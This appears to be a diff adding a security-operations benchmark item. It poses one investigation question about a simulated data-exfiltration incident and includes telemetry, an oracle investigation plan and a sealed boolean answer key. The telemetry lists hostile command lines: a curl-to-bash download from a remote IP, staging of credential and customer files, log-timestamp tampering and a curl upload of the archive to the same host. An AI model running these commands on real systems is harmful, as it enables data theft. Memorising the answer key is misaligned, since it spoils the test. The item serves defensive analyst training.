@@ -1,0 +1,328 @@
+{
+  "incident_id": "secops-q-c02-ti-match",
+  "name": "SecOps case-02-collection-exfil/q-c02-ti-match",
+  "source_benchmark": "Cyber-SecOps-ES",
+  "source_scenario": "case-02-collection-exfil/q-c02-ti-match",
+  "alert": {
+    "timestamp": "2026-07-29T02:27:43Z",
+    "host": "ubuntu-2404-noble-amd64-base",
+    "user": "unknown",
+    "alert_type": "secops_investigation",
+    "summary": "Is the exfiltration destination IP (204.168.178.42) flagged by threat intelligence in this environment?"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "process_events",
+      "network",
+      "alerts"
+    ],
+    "start": "2026-07-29T02:27:43Z",
+    "end": "2026-07-29T02:28:20Z",
+    "hosts": [
+      "ubuntu-2404-noble-amd64-base"
+    ]
+  },
+  "telemetry": {
+    "process_events": [
+      {
+        "event_id": "evidence-pf-0001-1d89576c",
+        "timestamp": "2026-07-29T02:27:43.267Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s2.sh | bash",
+        "cat": "process/exec"
+      },
+      {
+        "event_id": "evidence-pf-0002-18e39dc3",
+        "timestamp": "2026-07-29T02:27:43.270Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s2.sh",
+        "cat": "process/exec"
+      },
+      {
+        "event_id": "evidence-pf-0003-bbe1c5a6",
+        "timestamp": "2026-07-29T02:27:43.283Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "base64",
+        "parent_process_name": "bash",
+        "command_line": "base64 -d",
+        "cat": "process/exec",
+        "attck": "T1140"
+      },
+      {
+        "event_id": "evidence-pf-0004-d387b942",
+        "timestamp": "2026-07-29T02:27:43.286Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "timeout",
+        "command_line": "bash -c echo >/dev/tcp/127.0.0.1/22",
+        "cat": "process/exec",
+        "attck": "T1046"
+      },
+      {
+        "event_id": "evidence-pf-0005-25a90245",
+        "timestamp": "2026-07-29T02:27:43.312Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "bash",
+        "command_line": "bash",
+        "file": "/tmp/.stage/customers.csv",
+        "cat": "file/creation",
+        "attck": "T1005"
+      },
+      {
+        "event_id": "evidence-pf-0006-13f2ea75",
+        "timestamp": "2026-07-29T02:27:43.312Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "bash",
+        "command_line": "bash",
+        "file": "/tmp/.stage/creds.txt",
+        "cat": "file/creation",
+        "attck": "T1552.001"
+      },
+      {
+        "event_id": "evidence-pf-0007-a9a36bc0",
+        "timestamp": "2026-07-29T02:27:43.316Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "tar",
+        "parent_process_name": "bash",
+        "command_line": "tar czf /tmp/.stage.tgz -C /tmp .stage",
+        "cat": "process/exec",
+        "attck": "T1560.001"
+      },
+      {
+        "event_id": "evidence-pf-0008-66cb731b",
+        "timestamp": "2026-07-29T02:27:43.317Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "tar",
+        "parent_process_name": "bash",
+        "command_line": "tar",
+        "file": "/tmp/.stage.tgz",
+        "cat": "file/creation"
+      },
+      {
+        "event_id": "evidence-pf-0009-fdabef39",
+        "timestamp": "2026-07-29T02:27:43.324Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "touch",
+        "parent_process_name": "bash",
+        "command_line": "touch -t 202001010000 /tmp/.stage.tgz",
+        "cat": "process/exec",
+        "attck": "T1070.006"
+      },
+      {
+        "event_id": "evidence-pf-0010-b24c8969",
+        "timestamp": "2026-07-29T02:27:43.328Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -T /tmp/.stage.tgz http://204.168.178.42:8080/exfil.tgz",
+        "cat": "process/exec",
+        "attck": "T1041"
+      },
+      {
+        "event_id": "evidence-pf-0011-87a93a42",
+        "timestamp": "2026-07-29T02:27:43.334Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "curl",
+        "parent_process_name": "",
+        "command_line": "curl",
+        "destination.ip": "204.168.178.42",
+        "destination.port": 8080,
+        "cat": "network/connection_attempted"
+      }
+    ],
+    "network": [
+      {
+        "event_id": "evidence-net-0001-07248840",
+        "timestamp": "2026-07-29T02:27:43Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "destination_ip": "204.168.178.42",
+        "destination_port": 443,
+        "protocol": "tcp"
+      }
+    ],
+    "alerts": [
+      {
+        "event_id": "evidence-al-0001-a9b54838",
+        "timestamp": "2026-07-29T02:27:41.524Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Threat Intel IP Address Indicator Match",
+        "severity": "high",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:27:41.524Z",
+          "rule": "Threat Intel IP Address Indicator Match",
+          "severity": "high"
+        }
+      },
+      {
+        "event_id": "evidence-al-0002-a0587a57",
+        "timestamp": "2026-07-29T02:28:17.996Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Malicious Behavior Detection Alert: Egress Network Connection Followed by Command Execution",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:28:17.996Z",
+          "rule": "Malicious Behavior Detection Alert: Egress Network Connection Followed by Command Execution",
+          "severity": "critical"
+        }
+      },
+      {
+        "event_id": "evidence-al-0003-d488cec7",
+        "timestamp": "2026-07-29T02:28:18.005Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Malicious Behavior Detection Alert: File Downloaded via Curl or Wget to Hidden Directory",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:28:18.005Z",
+          "rule": "Malicious Behavior Detection Alert: File Downloaded via Curl or Wget to Hidden Directory",
+          "severity": "critical"
+        }
+      },
+      {
+        "event_id": "evidence-al-0004-c7e96d0b",
+        "timestamp": "2026-07-29T02:28:18.015Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Malicious Behavior Detection Alert: Suspicious File Downloaded by Curl/Wget and Piped to Interpreter",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:28:18.015Z",
+          "rule": "Malicious Behavior Detection Alert: Suspicious File Downloaded by Curl/Wget and Piped to Interpreter",
+          "severity": "critical"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "evidence-pf-0001-1d89576c",
+      "source": "alerts",
+      "timestamp": "2026-07-29T02:27:43.267Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s2.sh | bash",
+        "cat": "process/exec"
+      }
+    },
+    {
+      "event_id": "evidence-pf-0002-18e39dc3",
+      "source": "alerts",
+      "timestamp": "2026-07-29T02:27:43.270Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s2.sh",
+        "cat": "process/exec"
+      }
+    },
+    {
+      "event_id": "evidence-pf-0003-bbe1c5a6",
+      "source": "alerts",
+      "timestamp": "2026-07-29T02:27:43.283Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "base64",
+        "parent_process_name": "bash",
+        "command_line": "base64 -d",
+        "cat": "process/exec",
+        "attck": "T1140"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "process_events",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "network",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "Is the exfiltration destination IP (204.168.178.42) flagged by threat intelligence in this environment?",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "process_events",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "network",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "Is the exfiltration destination IP (204.168.178.42) flagged by threat intelligence in this environment?",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-SecOps-ES",
+    "scenario": "case-02-collection-exfil/q-c02-ti-match",
+    "answer": true,
+    "accept": [
+      true
+    ],
+    "grading": "boolean",
+    "attck": [],
+    "sealed": true
+  }
+}
